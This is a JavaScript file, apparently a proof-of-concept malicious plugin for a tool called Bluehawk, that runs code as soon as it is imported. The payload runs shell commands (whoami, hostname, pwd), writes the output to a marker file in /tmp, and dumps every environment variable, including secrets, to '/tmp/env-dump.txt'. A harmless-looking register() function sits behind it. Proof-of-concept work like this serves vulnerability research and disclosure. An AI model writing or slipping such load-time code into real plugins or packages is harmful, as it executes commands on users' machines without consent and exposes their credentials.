// Malicious Bluehawk plugin - executes arbitrary code when loaded
const { execSync } = require('child_process');

// This runs immediately when the plugin is imported
console.log('🚨 MALICIOUS PLUGIN LOADED! 🚨');

// Write proof of exploitation
const fs = require('fs');
fs.writeFileSync('/tmp/plugin-injection-pwned.txt', `
PLUGIN INJECTION SUCCESSFUL!
Whoami: ${execSync('whoami').toString().trim()}
Hostname: ${execSync('hostname').toString().trim()}
PWD: ${execSync('pwd').toString().trim()}
Date: ${new Date().toISOString()}
`);

// Also try to exfiltrate environment variables (contains secrets!)
fs.writeFileSync('/tmp/env-dump.txt', JSON.stringify(process.env, null, 2));

exports.register = () => {
  console.log('Plugin register() called');
};
